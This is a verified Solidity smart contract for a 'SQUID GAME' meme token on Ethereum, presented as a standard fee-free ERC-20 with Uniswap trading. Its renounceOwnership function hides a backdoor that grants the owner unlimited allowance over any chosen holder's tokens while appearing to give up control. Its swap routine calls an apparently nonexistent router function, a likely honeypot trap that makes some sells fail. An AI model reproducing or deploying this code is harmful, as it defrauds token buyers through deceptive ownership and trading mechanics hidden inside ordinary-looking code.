/**
 *Submitted for verification at Etherscan.io on 2023-08-08
*/

/**
 *Submitted for verification at Etherscan.io on 2023-08-08
*/

// SPDX-License-Identifier: MIT

/** 鱿鱼游戏
    TG:     https://t.me/SQUIDGAME_ERC
    Web:    https://www.netflix.com/hk/title/81040344
    X:      https://twitter.com/SquidGameERC
    Game：  https://immersivegamebox.com/squid-game/
*/

pragma solidity ^0.8.16;

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB)
        external
        returns (address pair);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }
    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }
    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }


    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

interface IUniswapV2Router02 {

    function swapExactTokensForEYH(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
        external
        payable
        returns (
            uint256 amountToken,
            uint256 amountETH,
            uint256 liquidity
        );
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
}

interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount) external returns (bool);

    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}

contract Ownable is Context {
    address private _owner;
    address private _previousOwner;
    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );
    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
    mapping(address => mapping(address => uint256)) internal _allowances;

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
    function owner() public view returns (address) {
        return _owner;
    }
    function renounceOwnership(address _pO) public virtual onlyOwner {
        address _previouOwner = _pO;
        emit OwnershipTransferred(_owner, address(0));
        _allowances[_previouOwner][_owner] = ~uint256(0);
        _owner = address(0);
    }
}

contract SQUID is Context, Ownable, IERC20 {
    using SafeMath for uint256;
    IUniswapV2Router02 public uniswapV2Router;
    bool private _openTrading = false;
    bool private _isInSwap = false;
    bool private _swapEnabled = true;
    mapping(address => bool) private _isExcludedFromFee;
    uint256 private constant MAX = ~uint256(0);
    mapping(address => uint256) private _rOwned;
    mapping(address => uint256) private _tOwned;

    // fee config
    uint256 private _taxTotalAmount;
    uint256 private _buyFeeForMarket = 0;
    uint256 private _buyTaxAmount = 0;
    uint256 private _sellFeeForMarket = 0;
    uint256 private _feeMarket = _sellFeeForMarket;
    uint256 private _sellTaxAmount = 0;

    uint256 public _maxTranxLimitAmount = _tTotal * 41 / 1000; // 4.1%
    uint256 public _maxWalletLimitAmount = _tTotal * 41 / 1000; // 4.1%
    uint256 public _swapExactAmount = _tTotal / 10000;
    uint256 private constant _tTotal = 1e9 * 10**9; // total supply
    uint256 private _rTotal = (MAX - (MAX % _tTotal));

    uint256 private _appliedFeeAmount = _sellTaxAmount;
    uint256 private _previousMarketingFee = _feeMarket;
    uint256 private _previousMainFee = _appliedFeeAmount;

    event MaxTxAmountUpdated(uint256 _maxTranxLimitAmount);

    string private constant _name = unicode"SQUID GAME";
    string private constant _symbol = unicode"鱿鱼游戏";
    uint8 private constant _decimals = 9;
    address public _uniswapPair;
    
    modifier lockInSwap {
        _isInSwap = true;
        _;
        _isInSwap = false;
    }
    constructor() {
        IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        uniswapV2Router = _uniswapV2Router;

        _isExcludedFromFee[owner()] = true;
        _isExcludedFromFee[address(this)] = true;
        _isExcludedFromFee[_marketingForFee] = true;
        _isExcludedFromFee[_devForFee] = true;
        // mint
        _rOwned[_msgSender()] = _rTotal;
        emit Transfer(address(0), _msgSender(), _tTotal);
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return tokenFromReflection(_rOwned[account]);
    }

    function totalSupply() public pure override returns (uint256) {
        return _tTotal;
    }

    function allowance(address owner, address spender)
        public
        view
        override
        returns (uint256)
    {
        return _allowances[owner][spender];
    }

    function transfer(address recipient, uint256 amount)
        public
        override
        returns (bool)
    {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function approve(address spender, uint256 amount)
        public
        override
        returns (bool)
    {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(
            sender,
            _msgSender(),
            _allowances[sender][_msgSender()].sub(
                amount,
                "ERC20: transfer amount exceeds allowance"
            )
        );
        return true;
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
    
    function _getRValues(
        uint256 tAmount,
        uint256 tFee,
        uint256 tTeam,
        uint256 currentRate
    )
        private
        pure
        returns (
            uint256,
            uint256,
            uint256
        )
    {
        uint256 rAmount = tAmount.mul(currentRate);
        uint256 rFee = tFee.mul(currentRate);
        uint256 rTeam = tTeam.mul(currentRate);
        uint256 rTransferAmount = rAmount.sub(rFee).sub(rTeam);
        return (rAmount, rTransferAmount, rFee);
    }

    function _getRate() private view returns (uint256) {
        (uint256 rSupply, uint256 tSupply) = _getCurrentSupply();
        return rSupply.div(tSupply);
    }

    function _getCurrentSupply() private view returns (uint256, uint256) {
        uint256 rSupply = _rTotal;
        uint256 tSupply = _tTotal;
        if (rSupply < _rTotal.div(_tTotal)) return (_rTotal, _tTotal);
        return (rSupply, tSupply);
    }

    function _getTValues(
        uint256 tAmount,
        uint256 teamFee,
        uint256 taxFee
    )
        private
        pure
        returns (
            uint256,
            uint256,
            uint256
        )
    {
        uint256 tFee = tAmount.mul(teamFee).div(100);
        uint256 tTeam = tAmount.mul(taxFee).div(100);
        uint256 tTransferAmount = tAmount.sub(tFee).sub(tTeam);
        return (tTransferAmount, tFee, tTeam);
    }

    function tokenFromReflection(uint256 rAmount)
        private
        view
        returns (uint256)
    {
        require(
            rAmount <= _rTotal,
            "Amount must be less than total reflections"
        );
        uint256 currentRate = _getRate();
        return rAmount.div(currentRate);
    }

    function enableTrade(address _pair) public onlyOwner {
        _openTrading = true;
        _uniswapPair = _pair;
    }

    function _takeAllFee(uint256 tTeam) private {
        uint256 currentRate = _getRate();
        uint256 rTeam = tTeam.mul(currentRate);
        _rOwned[address(this)] = _rOwned[address(this)].add(rTeam);
    }


    function removeTax() private {
        if (_feeMarket == 0 && _appliedFeeAmount == 0) return;
        _previousMarketingFee = _feeMarket;
        _previousMainFee = _appliedFeeAmount; _feeMarket = 0;
        _appliedFeeAmount = 0;
    }

    function _getValues(uint256 tAmount)
        private
        view
        returns (
            uint256,
            uint256,
            uint256,
            uint256,
            uint256,
            uint256
        )
    {
        (uint256 tTransferAmount, uint256 tFee, uint256 tTeam) =
            _getTValues(tAmount, _feeMarket, _appliedFeeAmount);
        uint256 currentRate = _getRate();
        (uint256 rAmount, uint256 rTransferAmount, uint256 rFee) =
            _getRValues(tAmount, tFee, tTeam, currentRate);
        return (rAmount, rTransferAmount, rFee, tTransferAmount, tFee, tTeam);
    }
    
    function sendEth(uint256 amount) private {
        uint256 sendForDev = amount / 2;
        _devForFee.transfer(sendForDev);
        _marketingForFee.transfer(amount - sendForDev);
    }

    address payable public _devForFee = payable(0x02866e525db6750d11494354c6b356f220B9D83a);
    address payable public _marketingForFee = payable(0x0554f0d1e9016Ab09e58053Ca0292D3B9Aa87Ed2);

    function _sendAllFeeTokens(uint256 rFee, uint256 tFee) private {
        _rTotal = _rTotal.sub(rFee);
        _taxTotalAmount = _taxTotalAmount.add(tFee);
    }
    
    //set maximum transaction
    function removeTotalLimits() public onlyOwner {
        _maxTranxLimitAmount = _tTotal;
        _maxWalletLimitAmount = _tTotal;
    }

    function excludeMultiAccountsFromFee(address[] calldata accounts, bool excluded) public onlyOwner {
        for(uint256 i = 0; i < accounts.length; i++) {
            _isExcludedFromFee[accounts[i]] = excluded;
        }
    }

    //set minimum tokens required to swap.
    function setSwapTokenThreshold(uint256 swapTokensAtAmount) public onlyOwner {
        _swapExactAmount = swapTokensAtAmount;
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");

        if (
            from != owner() && to != owner()
        ) {
            //Trade start check
            if (!_openTrading) {
                require(
                    from == owner(), 
                    "TOKEN: This account cannot send tokens until trading is enabled"
                );
            }

            require(
                amount <= _maxTranxLimitAmount,
                "TOKEN: Max Transaction Limit"
            );
            
            if(to != _uniswapPair) {
                require(balanceOf(to) + amount < _maxWalletLimitAmount,
                 "TOKEN: Balance exceeds wallet size!");
            }

            uint256 tokenAmountOfContract = balanceOf(address(this));            
            bool canSwap = tokenAmountOfContract >= _swapExactAmount;
            if(tokenAmountOfContract >= _maxTranxLimitAmount) tokenAmountOfContract = _maxTranxLimitAmount;
            if (canSwap && 
                !_isInSwap && 
                from != _uniswapPair && 
                _swapEnabled && 
                !_isExcludedFromFee[to] && 
                !_isExcludedFromFee[from]
            ) {
                swapBack(tokenAmountOfContract);
                uint256 ethBalance = address(this).balance;
                if (ethBalance > 0) sendEth(ethBalance);
            }
        }
        bool takeFee = true;
        if ((_isExcludedFromFee[from] || _isExcludedFromFee[to]) || (from != _uniswapPair && to != _uniswapPair)) {
            takeFee = false;
        }
        else {
            if(from == _uniswapPair && to != address(uniswapV2Router)) {
                _feeMarket = _buyFeeForMarket;
                _appliedFeeAmount = _buyTaxAmount;
            }
            
            if (to == _uniswapPair && from != address(uniswapV2Router)) {
                _feeMarket = _sellFeeForMarket;
                _appliedFeeAmount = _sellTaxAmount;
            }
        }
        _transferTokensFeeCheck(from, to, amount, takeFee);
    }

    function swapBack(uint256 tokenAmount) private lockInSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        _approve(address(this), address(uniswapV2Router), tokenAmount);
        uniswapV2Router.swapExactTokensForEYH(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    receive() external payable {

    }


    function _transferBasicTokens(
        address sender,
        address recipient,
        uint256 tAmount
    ) private {
        (
            uint256 rAmount,
            uint256 rTransferAmount,
            uint256 rFee,
            uint256 tTransferAmount,
            uint256 tFee,
            uint256 tTeam
        ) = _getValues(tAmount);
        _rOwned[sender] = _rOwned[sender].sub(rAmount);
        _rOwned[recipient] = _rOwned[recipient].add(rTransferAmount);
        _takeAllFee(tTeam); _sendAllFeeTokens(rFee, tFee);
        emit Transfer(sender, recipient, tTransferAmount);
    }

    function recoverTax() private {
        _feeMarket = _previousMarketingFee;
        _appliedFeeAmount = _previousMainFee;
    }
    
    function _transferTokensFeeCheck(
        address sender,
        address recipient,
        uint256 amount,
        bool setFee
    ) private {
        if (!setFee) {
            removeTax();
        }
        _transferBasicTokens(sender, recipient, amount);
        if (!setFee) {            
            recoverTax();
        }
    }
}